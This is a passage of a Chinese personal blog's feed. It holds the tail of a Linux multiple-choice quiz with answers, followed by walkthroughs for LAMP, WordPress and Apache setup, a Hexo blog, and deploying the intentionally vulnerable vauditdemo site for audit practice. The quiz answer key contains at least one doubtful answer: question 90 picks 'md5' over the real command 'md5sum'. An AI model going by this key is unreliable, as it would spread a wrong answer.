apache.conf</p><p>77.通过Makefile来安装已编译过的代码的命令是：(d)</p><p>A. make<br>B. install<br>C. make depend<br>D. make install</p><p>78.什么命令解压缩tar文件？(b)</p><p>A. tar -czvf filename.tgz<br>B. tar -xzvf filename.tgz<br>C. tar -tzvf filename.tgz<br>D. tar -dzvf filename.tgz</p><p>84.命令 netstat -a 停了很长时间没有响应，这可能是哪里的问题？(b)</p><p>A. NFS.<br>B. DNS.<br>C. NIS.<br>D. routing.</p><p>85.ping使用的协议是：(d)</p><p>A. TCP<br>B. UDP<br>C. SMB<br>D. ICMP</p><p>86.下面哪个命令不是用来查看网络故障的？(b)</p><p>A. ping<br>B. init<br>C. telnet<br>D. netstat</p><p>87.拨号上网使用的协议通常是：(a)</p><p>A. PPP<br>B. UUCP<br>C. SLIP<br>D. Ethernet</p><p>88.TCP/IP中，哪个协议是用来进行IP自动分配的？(c)</p><p>A. ARP<br>B. NFS<br>C. DHCP<br>D. DNS</p><p>90.下面哪个功能用来生成一个文件的校验码？(a)</p><p>A. md5<br>B. tar<br>C. crypt<br>D. md5sum</p><p>93.如何停止一台机器的telnet服务？(d)</p><p>A. Put NONE in /etc/telnet.allow<br>B. Put a line ‘ALL:ALL’ in /etc/hosts.deny<br>C. Comment the telnet entry in /etc/inittab<br>D. Comment the telnet entry in /etc/xinetd.conf</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:做了五十道linux题，对linux系统有了深入的了解。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;下面哪个Linux命令可以一次显示一页内容？(c)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;A. pause&lt;br&gt;B. cat&lt;br&gt;C. more&lt;br&gt;D. grep&lt;/p&gt;
&lt;p&gt;2.统计
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>lamp环境搭建及应用</title>
    <link href="https://wocao828.github.io/2018/12/05/lamp%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E5%BA%94%E7%94%A8/"/>
    <id>https://wocao828.github.io/2018/12/05/lamp环境搭建及应用/</id>
    <published>2018-12-05T12:07:02.000Z</published>
    <updated>2018-12-06T08:37:09.653Z</updated>
    
    <content type="html"><![CDATA[<p>前言:今天在centos6和7上搭建了lamp环境，同时对centos6和7防火墙规则设置有所了解</p><h2 id="一-搭建lamp"><a href="#一-搭建lamp" class="headerlink" title="一.搭建lamp"></a>一.搭建lamp</h2><h3 id="1-安装apache"><a href="#1-安装apache" class="headerlink" title="1.安装apache"></a>1.安装apache</h3><p>yum install httpd httpd-devel httpd-manual mod_ssl mod_perl mod_auth_mysql</p><h3 id="2-启动apache"><a href="#2-启动apache" class="headerlink" title="2.启动apache"></a>2.启动apache</h3><p>service httpd start(centos6)<br><img src="/2018/12/05/lamp环境搭建及应用/2_1.png" alt="2"><br>systemctl start httpd(centos7)<br><img src="/2018/12/05/lamp环境搭建及应用/2_2.png" alt="2"></p><h3 id="3-设定防火墙，允许主机对虚拟机的80端口访问"><a href="#3-设定防火墙，允许主机对虚拟机的80端口访问" class="headerlink" title="3.设定防火墙，允许主机对虚拟机的80端口访问"></a>3.设定防火墙，允许主机对虚拟机的80端口访问</h3><p>centos6如下图<br><img src="/2018/12/05/lamp环境搭建及应用/3_1.png" alt="3"><br>centos7如下图<br><img src="/2018/12/05/lamp环境搭建及应用/3_2.png" alt="3"></p><h3 id="4-设置apache自启动"><a href="#4-设置apache自启动" class="headerlink" title="4.设置apache自启动"></a>4.设置apache自启动</h3><p>centos6如下图<br><img src="/2018/12/05/lamp环境搭建及应用/4_1.png" alt="4"><br>centos7如下图<br><img src="/2018/12/05/lamp环境搭建及应用/4_2.png" alt="4"></p><h3 id="5-安装mysql"><a href="#5-安装mysql" class="headerlink" title="5.安装mysql"></a>5.安装mysql</h3><p>centos6:  yum install mysql mysql-server mysql-devel</p><p>centos7:  yum install mysql mariadb-server mysql-devel</p><h3 id="6-启动mysql服务"><a href="#6-启动mysql服务" class="headerlink" title="6.启动mysql服务"></a>6.启动mysql服务</h3><p>service mysqld start(centos6)<br><img src="/2018/12/05/lamp环境搭建及应用/6_1.png" alt="6"><br>systemctl start mariadb(centos7)<br><img src="/2018/12/05/lamp环境搭建及应用/6_2.png" alt="6"></p><h3 id="7-设置mysql"><a href="#7-设置mysql" class="headerlink" title="7.设置mysql"></a>7.设置mysql</h3><p>centos6如下图<br><img src="/2018/12/05/lamp环境搭建及应用/7_1.png" alt="7"><br>centos7如下图<br><img src="/2018/12/05/lamp环境搭建及应用/7_2.png" alt="7"></p><h3 id="8-安装php"><a href="#8-安装php" class="headerlink" title="8.安装php"></a>8.安装php</h3><p>yum install php php-mysql php-common php-gd php-mbstring php-mcrypt php-devel php-xml</p><h2 id="二-在centos6下搭建wordpress"><a href="#二-在centos6下搭建wordpress" class="headerlink" title="二.在centos6下搭建wordpress"></a>二.在centos6下搭建wordpress</h2><h3 id="1-将wordpress下载并传入-var-www-html下"><a href="#1-将wordpress下载并传入-var-www-html下" class="headerlink" title="1.将wordpress下载并传入/var/www/html下"></a>1.将wordpress下载并传入/var/www/html下</h3><h3 id="2-给其授权-如图"><a href="#2-给其授权-如图" class="headerlink" title="2.给其授权,如图:"></a>2.给其授权,如图:</h3><p><img src="/2018/12/05/lamp环境搭建及应用/er_2.png" alt="2"></p><h3 id="3-在mysql中创建wordpress数据库，如图"><a href="#3-在mysql中创建wordpress数据库，如图" class="headerlink" title="3.在mysql中创建wordpress数据库，如图:"></a>3.在mysql中创建wordpress数据库，如图:</h3><p><img src="/2018/12/05/lamp环境搭建及应用/er_3.png" alt="3"></p><h3 id="4-在浏览器中安装，成功后如图"><a href="#4-在浏览器中安装，成功后如图" class="headerlink" title="4.在浏览器中安装，成功后如图:"></a>4.在浏览器中安装，成功后如图:</h3><p><img src="/2018/12/05/lamp环境搭建及应用/er_4.png" alt="4"></p><h2 id="三-在centos7下搭建一个漏洞网站"><a href="#三-在centos7下搭建一个漏洞网站" class="headerlink" title="三.在centos7下搭建一个漏洞网站"></a>三.在centos7下搭建一个漏洞网站</h2><h3 id="1-将vauditdemo下载并传入-var-www-html下"><a href="#1-将vauditdemo下载并传入-var-www-html下" class="headerlink" title="1.将vauditdemo下载并传入/var/www/html下"></a>1.将vauditdemo下载并传入/var/www/html下</h3><h3 id="2-创建数据库vauditdemo，导入sql文件，如图"><a href="#2-创建数据库vauditdemo，导入sql文件，如图" class="headerlink" title="2.创建数据库vauditdemo，导入sql文件，如图:"></a>2.创建数据库vauditdemo，导入sql文件，如图:</h3><p><img src="/2018/12/05/lamp环境搭建及应用/san_2.png" alt="2"></p><h3 id="3-修改sys下的config-php配置"><a href="#3-修改sys下的config-php配置" class="headerlink" title="3.修改sys下的config.php配置"></a>3.修改sys下的config.php配置</h3><p><img src="/2018/12/05/lamp环境搭建及应用/san_3.png" alt="2"></p><h3 id="4-用浏览器打开，如图"><a href="#4-用浏览器打开，如图" class="headerlink" title="4.用浏览器打开，如图:"></a>4.用浏览器打开，如图:</h3><p><img src="/2018/12/05/lamp环境搭建及应用/san_4.png" alt="2"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:今天在centos6和7上搭建了lamp环境，同时对centos6和7防火墙规则设置有所了解&lt;/p&gt;
&lt;h2 id=&quot;一-搭建lamp&quot;&gt;&lt;a href=&quot;#一-搭建lamp&quot; class=&quot;headerlink&quot; title=&quot;一.搭建lamp&quot;&gt;&lt;/a&gt;一.搭建l
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>在centos下搭建apache环境</title>
    <link href="https://wocao828.github.io/2018/12/04/%E5%9C%A8centos%E4%B8%8B%E6%90%AD%E5%BB%BAapache%E7%8E%AF%E5%A2%83/"/>
    <id>https://wocao828.github.io/2018/12/04/在centos下搭建apache环境/</id>
    <published>2018-12-04T12:17:27.000Z</published>
    <updated>2018-12-04T14:01:39.782Z</updated>
    
    <content type="html"><![CDATA[<p>前言:以前在ubuntu下搭建过apache服务器，今天在centos下搭建了apache环境</p><h3 id="1-在虚拟机中安装centos系统，查看ssh服务是否开启"><a href="#1-在虚拟机中安装centos系统，查看ssh服务是否开启" class="headerlink" title="1.在虚拟机中安装centos系统，查看ssh服务是否开启"></a>1.在虚拟机中安装centos系统，查看ssh服务是否开启</h3><p><img src="/2018/12/04/在centos下搭建apache环境/1.png" alt="1"></p><h3 id="2-在主机上下载安装termius软件，输入ip，账户和密码登录"><a href="#2-在主机上下载安装termius软件，输入ip，账户和密码登录" class="headerlink" title="2.在主机上下载安装termius软件，输入ip，账户和密码登录"></a>2.在主机上下载安装termius软件，输入ip，账户和密码登录</h3><p><img src="/2018/12/04/在centos下搭建apache环境/2.png" alt="2"></p><h3 id="3-在主机上下载安装cyberduck并连接"><a href="#3-在主机上下载安装cyberduck并连接" class="headerlink" title="3.在主机上下载安装cyberduck并连接"></a>3.在主机上下载安装cyberduck并连接</h3><p><img src="/2018/12/04/在centos下搭建apache环境/3.png" alt="3"></p><h3 id="4-在apache官网下载apache"><a href="#4-在apache官网下载apache" class="headerlink" title="4.在apache官网下载apache"></a>4.在apache官网下载apache</h3><p>地址:<br><a href="http://httpd.apache.org/download.cgi#apache24" target="_blank" rel="noopener">http://httpd.apache.org/download.cgi#apache24</a></p><h3 id="5-下载依赖库apr-apr-util-pcre-因为我的centos和依赖库版本低，不能对应上apache版本，所以从官网下载，如果你是centos7以上可以用yum直接安装"><a href="#5-下载依赖库apr-apr-util-pcre-因为我的centos和依赖库版本低，不能对应上apache版本，所以从官网下载，如果你是centos7以上可以用yum直接安装" class="headerlink" title="5.下载依赖库apr,apr-util,pcre(因为我的centos和依赖库版本低，不能对应上apache版本，所以从官网下载，如果你是centos7以上可以用yum直接安装)"></a>5.下载依赖库apr,apr-util,pcre(因为我的centos和依赖库版本低，不能对应上apache版本，所以从官网下载，如果你是centos7以上可以用yum直接安装)</h3><p>apr和apr-util地址:<a href="http://apr.apache.org/download.cgi" target="_blank" rel="noopener">http://apr.apache.org/download.cgi</a></p><p>pcre地址:<a href="https://sourceforge.net/projects/pcre/files/pcre/" target="_blank" rel="noopener">https://sourceforge.net/projects/pcre/files/pcre/</a></p><h3 id="6-将apache-apr-apr-util-pcre通过cyberduck上传到centos里"><a href="#6-将apache-apr-apr-util-pcre通过cyberduck上传到centos里" class="headerlink" title="6.将apache,apr,apr-util,pcre通过cyberduck上传到centos里"></a>6.将apache,apr,apr-util,pcre通过cyberduck上传到centos里</h3><h3 id="7-解压安装包-如图"><a href="#7-解压安装包-如图" class="headerlink" title="7.解压安装包,如图:"></a>7.解压安装包,如图:</h3><p><img src="/2018/12/04/在centos下搭建apache环境/7.png" alt="7"></p><h3 id="8-从apr-apr-util-pcre-apache逐个-configure-make-make-install如图："><a href="#8-从apr-apr-util-pcre-apache逐个-configure-make-make-install如图：" class="headerlink" title="8.从apr,apr-util,pcre,apache逐个./configure,make,make install如图："></a>8.从apr,apr-util,pcre,apache逐个./configure,make,make install如图：</h3><p><img src="/2018/12/04/在centos下搭建apache环境/8.png" alt="8"></p><h3 id="9-启动apache服务"><a href="#9-启动apache服务" class="headerlink" title="9.启动apache服务"></a>9.启动apache服务</h3><p>apachectl start</p><h3 id="10-关闭防火墙"><a href="#10-关闭防火墙" class="headerlink" title="10.关闭防火墙"></a>10.关闭防火墙</h3><p>service iptables stop(centos6)<br>systemctl stop firewalld(centos7)</p><h3 id="11-从主机中访问网站"><a href="#11-从主机中访问网站" class="headerlink" title="11.从主机中访问网站"></a>11.从主机中访问网站</h3><h3 id="12-将上次的文件放入apache的hosts目录下"><a href="#12-将上次的文件放入apache的hosts目录下" class="headerlink" title="12.将上次的文件放入apache的hosts目录下"></a>12.将上次的文件放入apache的hosts目录下</h3><h3 id="13-再次访问网站，如下图"><a href="#13-再次访问网站，如下图" class="headerlink" title="13.再次访问网站，如下图:"></a>13.再次访问网站，如下图:</h3><p><img src="/2018/12/04/在centos下搭建apache环境/13.png" alt="13"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:以前在ubuntu下搭建过apache服务器，今天在centos下搭建了apache环境&lt;/p&gt;
&lt;h3 id=&quot;1-在虚拟机中安装centos系统，查看ssh服务是否开启&quot;&gt;&lt;a href=&quot;#1-在虚拟机中安装centos系统，查看ssh服务是否开启&quot; class
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>hexo github搭建个人博客</title>
    <link href="https://wocao828.github.io/2018/12/03/hexo-github%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
    <id>https://wocao828.github.io/2018/12/03/hexo-github搭建个人博客/</id>
    <published>2018-12-03T09:29:12.000Z</published>
    <updated>2018-12-05T12:12:43.089Z</updated>
    
    <content type="html"><![CDATA[<p>前言:Windows下使用hexo github搭建个人的博客</p><h3 id="1-安装配置node-js"><a href="#1-安装配置node-js" class="headerlink" title="1.安装配置node.js"></a>1.安装配置node.js</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/1.png" alt="1"></p><h3 id="2-安装配置git"><a href="#2-安装配置git" class="headerlink" title="2.安装配置git"></a>2.安装配置git</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/2.png" alt="2"></p><h3 id="3-注册一个github账号，新建一个项目，格式为项目名-github-io"><a href="#3-注册一个github账号，新建一个项目，格式为项目名-github-io" class="headerlink" title="3.注册一个github账号，新建一个项目，格式为项目名.github.io"></a>3.注册一个github账号，新建一个项目，格式为项目名.github.io</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/3_1.png" alt="3_1"><br><img src="/2018/12/03/hexo-github搭建个人博客/3_1.png" alt="3_2"><br><img src="/2018/12/03/hexo-github搭建个人博客/3_1.png" alt="3_3"></p><h3 id="4-创建一个文件叫index-html-写入内容"><a href="#4-创建一个文件叫index-html-写入内容" class="headerlink" title="4.创建一个文件叫index.html,写入内容"></a>4.创建一个文件叫index.html,写入内容</h3><h3 id="5-在e盘创建一个blog文件夹"><a href="#5-在e盘创建一个blog文件夹" class="headerlink" title="5.在e盘创建一个blog文件夹"></a>5.在e盘创建一个blog文件夹</h3><h3 id="6-输入npm-install-g-hexo-cli安装hexo"><a href="#6-输入npm-install-g-hexo-cli安装hexo" class="headerlink" title="6.输入npm install -g hexo-cli安装hexo"></a>6.输入npm install -g hexo-cli安装hexo</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/6.png" alt="6"></p><h3 id="7-输入hexo出现如下"><a href="#7-输入hexo出现如下" class="headerlink" title="7.输入hexo出现如下"></a>7.输入hexo出现如下</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/7.png" alt="7"></p><h3 id="8-初始化hexo"><a href="#8-初始化hexo" class="headerlink" title="8.初始化hexo"></a>8.初始化hexo</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/8.png" alt="8"></p><h3 id="9-输入hexo-generate"><a href="#9-输入hexo-generate" class="headerlink" title="9.输入hexo generate"></a>9.输入hexo generate</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/9.png" alt="9"></p><h3 id="10-将blog用vscode打开，更改配置文件-config-yml中的title-author-language-url等配置项"><a href="#10-将blog用vscode打开，更改配置文件-config-yml中的title-author-language-url等配置项" class="headerlink" title="10.将blog用vscode打开，更改配置文件_config.yml中的title,author,language,url等配置项"></a>10.将blog用vscode打开，更改配置文件_config.yml中的title,author,language,url等配置项</h3><h3 id="11-输入hexo-server"><a href="#11-输入hexo-server" class="headerlink" title="11.输入hexo server"></a>11.输入hexo server</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/11.png" alt="11"></p><h3 id="12-在浏览器中打开localhost-4000出现"><a href="#12-在浏览器中打开localhost-4000出现" class="headerlink" title="12.在浏览器中打开localhost:4000出现"></a>12.在浏览器中打开localhost:4000出现</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/12.png" alt="12"></p><h3 id="13-更换一个主题-在theme下用git下载一个主题，git-clone-1-https-github-com-shuiRong-hexo-theme-Ada"><a href="#13-更换一个主题-在theme下用git下载一个主题，git-clone-1-https-github-com-shuiRong-hexo-theme-Ada" class="headerlink" title="13.更换一个主题:在theme下用git下载一个主题，git clone                   [1]:https://github.com/shuiRong/hexo-theme-Ada"></a>13.更换一个主题:在theme下用git下载一个主题，git clone                   [1]:<a href="https://github.com/shuiRong/hexo-theme-Ada" target="_blank" rel="noopener">https://github.com/shuiRong/hexo-theme-Ada</a></h3><p><img src="/2018/12/03/hexo-github搭建个人博客/13.png" alt="13"></p><h3 id="14-更改配置文件-config-yml下的theme"><a href="#14-更改配置文件-config-yml下的theme" class="headerlink" title="14.更改配置文件_config.yml下的theme"></a>14.更改配置文件_config.yml下的theme</h3><h3 id="15-输入hexo-clean"><a href="#15-输入hexo-clean" class="headerlink" title="15.输入hexo clean"></a>15.输入hexo clean</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/15.png" alt="15"></p><h6 id="输入hexo-generate"><a href="#输入hexo-generate" class="headerlink" title="输入hexo generate"></a>输入hexo generate</h6><h6 id="输入hexo-server"><a href="#输入hexo-server" class="headerlink" title="输入hexo server"></a>输入hexo server</h6><h6 id="重新打开localhost-4000"><a href="#重新打开localhost-4000" class="headerlink" title="重新打开localhost:4000"></a>重新打开localhost:4000</h6><h3 id="16-安装配置githubdesktop-输入github账号-然后create-repository，输入项目名"><a href="#16-安装配置githubdesktop-输入github账号-然后create-repository，输入项目名" class="headerlink" title="16.安装配置githubdesktop,输入github账号,然后create repository，输入项目名"></a>16.安装配置githubdesktop,输入github账号,然后create repository，输入项目名</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/16.png" alt="16"></p><h3 id="17-将blog下public的所有文件复制到文档的github下面的项目名下面"><a href="#17-将blog下public的所有文件复制到文档的github下面的项目名下面" class="headerlink" title="17.将blog下public的所有文件复制到文档的github下面的项目名下面"></a>17.将blog下public的所有文件复制到文档的github下面的项目名下面</h3><h3 id="18-然后在githubdesktop下的summary和description写入东西-点commit-to-master"><a href="#18-然后在githubdesktop下的summary和description写入东西-点commit-to-master" class="headerlink" title="18.然后在githubdesktop下的summary和description写入东西,点commit to master"></a>18.然后在githubdesktop下的summary和description写入东西,点commit to master</h3><p><img src="/2018/12/03/hexo-github搭建个人博客/18.png" alt="18"></p><h2 id="19-然后点fetch-origin同步上去，最后输入https-项目名-出现如下"><a href="#19-然后点fetch-origin同步上去，最后输入https-项目名-出现如下" class="headerlink" title="19.然后点fetch origin同步上去，最后输入https://项目名,出现如下"></a>19.然后点fetch origin同步上去，最后输入https://项目名,出现如下</h2><p><img src="/2018/12/03/hexo-github搭建个人博客/19.png" alt="19"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前言:Windows下使用hexo github搭建个人的博客&lt;/p&gt;
&lt;h3 id=&quot;1-安装配置node-js&quot;&gt;&lt;a href=&quot;#1-安装配置node-js&quot; class=&quot;headerlink&quot; title=&quot;1.安装配置node.js&quot;&gt;&lt;/a&gt;1.安装配置no
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>My New Post</title>
    <link href="https://wocao828.github.io/2018/12/03/My-New-Post/"/>
    <id>https://wocao828.github.io/2018/12/03/My-New-Post/</id>
    <published>2018-12-03T07:07:17.000Z</published>
    <updated>2018-12-05T07:49:40.413Z</updated>
    
    <content type="html"><![CDATA[<h2 id="这是我的第一次写博客"><a href="#这是我的第一次写博客" class="headerlink" title="这是我的第一次写博客"></a>这是我的第一次写博客</h2><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><p><strong>这是加粗字体</strong></p><p><em>这是斜体</em></p><blockquote><blockquote><blockquote><p>这是引用</p></blockquote></blockquote></blockquote><p><img src="http://img1.imgtn.bdimg.com/it/u=550311296,3695483729&amp;fm=26&amp;gp=0.jpg" alt="1"></p><p><a href="http://www.baidu.com" target="_blank" rel="noopener">百度</a></p><p><code>啊</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;这是我的第一次写博客&quot;&gt;&lt;a href=&quot;#这是我的第一次写博客&quot; class=&quot;headerlink&quot; title=&quot;这是我的第一次写博客&quot;&gt;&lt;/a&gt;这是我的第一次写博客&lt;/h2&gt;&lt;h1 id=&quot;这是一级标题&quot;&gt;&lt;a href=&quot;#这是一级标题&quot; class=&quot;
      
    
    </summary>
    
    
  </entry>
  
</feed>
